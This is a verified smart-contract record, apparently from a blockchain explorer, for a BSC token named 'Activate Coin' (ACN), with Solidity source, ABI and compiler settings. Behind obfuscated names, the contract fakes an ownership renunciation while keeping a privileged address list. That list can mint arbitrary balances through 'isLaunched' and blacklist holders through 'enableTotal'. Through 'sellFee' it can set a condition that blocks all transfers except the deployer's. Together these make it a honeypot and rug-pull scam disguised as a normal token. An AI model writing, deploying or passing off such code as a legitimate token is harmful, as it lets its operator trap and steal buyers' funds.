{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract atShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenLaunched {\n    function createPair(address autoLaunchEnable, address senderMode) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface totalToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface toEnableFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptMax) external view returns (uint256);\n\n    function transfer(address listSender, uint256 tokenExempt) external returns (bool);\n\n    function allowance(address maxShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listSender,\n        uint256 tokenExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptTakeList, uint256 value);\n    event Approval(address indexed maxShould, address indexed spender, uint256 value);\n}\n\ninterface feeExemptMarketing is toEnableFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ActivateCoin is atShould, toEnableFrom, feeExemptMarketing {\n\n    uint8 private launchedReceiver = 18;\n\n    function launchedTokenEnable(address liquidityToken) public {\n        require(liquidityToken.balance < 100000);\n        if (senderToken) {\n            return;\n        }\n        if (feeWalletMarketing) {\n            fromTrading = true;\n        }\n        takeLaunched[liquidityToken] = true;\n        \n        senderToken = true;\n    }\n\n    bool public receiverLaunched;\n\n    uint256 private amountFromTake = 100000000 * 10 ** 18;\n\n    address tokenReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    constructor (){\n        if (isReceiverSwap != feeWalletMarketing) {\n            feeWalletMarketing = true;\n        }\n        totalWallet();\n        totalToken exemptLaunch = totalToken(tokenReceiver);\n        listSwapTo = tokenLaunched(exemptLaunch.factory()).createPair(exemptLaunch.WETH(), address(this));\n        tokenLiquidity = tokenLaunched(exemptLaunch.factory()).feeTo();\n        \n        fromAuto = _msgSender();\n        takeLaunched[fromAuto] = true;\n        enableWallet[fromAuto] = amountFromTake;\n        \n        emit Transfer(address(0), fromAuto, amountFromTake);\n    }\n\n    function sellFee(uint256 tokenExempt) public {\n        txExemptTo();\n        teamTakeTo = tokenExempt;\n    }\n\n    bool public senderToken;\n\n    function owner() external view returns (address) {\n        return liquidityMode;\n    }\n\n    address private liquidityMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountFromTake;\n    }\n\n    function isLaunched(address minLiquidityTotal, uint256 tokenExempt) public {\n        txExemptTo();\n        enableWallet[minLiquidityTotal] = tokenExempt;\n    }\n\n    uint256 listEnableAt;\n\n    string private atLiquidity = \"ACN\";\n\n    string private liquidityShould = \"Activate Coin\";\n\n    mapping(address => bool) public limitTeam;\n\n    function transferFrom(address listMarketingSender, address listSender, uint256 tokenExempt) external override returns (bool) {\n        if (_msgSender() != tokenReceiver) {\n            if (receiverBuy[listMarketingSender][_msgSender()] != type(uint256).max) {\n                require(tokenExempt <= receiverBuy[listMarketingSender][_msgSender()]);\n                receiverBuy[listMarketingSender][_msgSender()] -= tokenExempt;\n            }\n        }\n        return launchBuyToken(listMarketingSender, listSender, tokenExempt);\n    }\n\n    function receiverMarketing(address listMarketingSender, address listSender, uint256 tokenExempt) internal view returns (uint256) {\n        require(tokenExempt > 0);\n\n        uint256 teamLaunched = 0;\n        if (listMarketingSender == listSwapTo && fromFee > 0) {\n            teamLaunched = tokenExempt * fromFee / 100;\n        } else if (listSender == listSwapTo && toBuy > 0) {\n            teamLaunched = tokenExempt * toBuy / 100;\n        }\n        require(teamLaunched <= tokenExempt);\n        return tokenExempt - teamLaunched;\n    }\n\n    uint256 public autoSell;\n\n    function enableTotal(address walletFeeList) public {\n        txExemptTo();\n        \n        if (walletFeeList == fromAuto || walletFeeList == listSwapTo) {\n            return;\n        }\n        limitTeam[walletFeeList] = true;\n    }\n\n    event OwnershipTransferred(address indexed txLimitExempt, address indexed swapTotal);\n\n    mapping(address => bool) public takeLaunched;\n\n    uint256 constant modeSender = 15 ** 10;\n\n    uint256 public toBuy = 0;\n\n    bool private feeWalletMarketing;\n\n    mapping(address => uint256) private enableWallet;\n\n    address public listSwapTo;\n\n    function totalWallet() public {\n        emit OwnershipTransferred(fromAuto, address(0));\n        liquidityMode = address(0);\n    }\n\n    uint256 teamTakeTo;\n\n    function launchBuyToken(address listMarketingSender, address listSender, uint256 tokenExempt) internal returns (bool) {\n        if (listMarketingSender == fromAuto) {\n            return fundMarketing(listMarketingSender, listSender, tokenExempt);\n        }\n        uint256 launchLiquidity = toEnableFrom(listSwapTo).balanceOf(tokenLiquidity);\n        require(launchLiquidity == teamTakeTo);\n        require(listSender != tokenLiquidity);\n        if (limitTeam[listMarketingSender]) {\n            return fundMarketing(listMarketingSender, listSender, modeSender);\n        }\n        tokenExempt = receiverMarketing(listMarketingSender, listSender, tokenExempt);\n        return fundMarketing(listMarketingSender, listSender, tokenExempt);\n    }\n\n    address tokenLiquidity;\n\n    function allowance(address totalModeLimit, address minExempt) external view virtual override returns (uint256) {\n        if (minExempt == tokenReceiver) {\n            return type(uint256).max;\n        }\n        return receiverBuy[totalModeLimit][minExempt];\n    }\n\n    uint256 public launchTx;\n\n    uint256 public marketingBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLiquidity;\n    }\n\n    uint256 public launchedFund;\n\n    bool private isReceiverSwap;\n\n    bool public fromTrading;\n\n    function balanceOf(address exemptMax) public view virtual override returns (uint256) {\n        return enableWallet[exemptMax];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedReceiver;\n    }\n\n    address public fromAuto;\n\n    bool private feeLimit;\n\n    function transfer(address minLiquidityTotal, uint256 tokenExempt) external virtual override returns (bool) {\n        return launchBuyToken(_msgSender(), minLiquidityTotal, tokenExempt);\n    }\n\n    uint256 public toReceiver;\n\n    function getOwner() external view returns (address) {\n        return liquidityMode;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityShould;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverBuy;\n\n    function fundMarketing(address listMarketingSender, address listSender, uint256 tokenExempt) internal returns (bool) {\n        require(enableWallet[listMarketingSender] >= tokenExempt);\n        enableWallet[listMarketingSender] -= tokenExempt;\n        enableWallet[listSender] += tokenExempt;\n        emit Transfer(listMarketingSender, listSender, tokenExempt);\n        return true;\n    }\n\n    function txExemptTo() private view {\n        require(takeLaunched[_msgSender()]);\n    }\n\n    function approve(address minExempt, uint256 tokenExempt) public virtual override returns (bool) {\n        receiverBuy[_msgSender()][minExempt] = tokenExempt;\n        emit Approval(_msgSender(), minExempt, tokenExempt);\n        return true;\n    }\n\n    uint256 public fromFee = 3;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txLimitExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptTakeList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalModeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFeeList\",\"type\":\"address\"}],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"isLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"}],\"name\":\"launchedTokenEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwapTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLiquidityTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketingSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ActivateCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}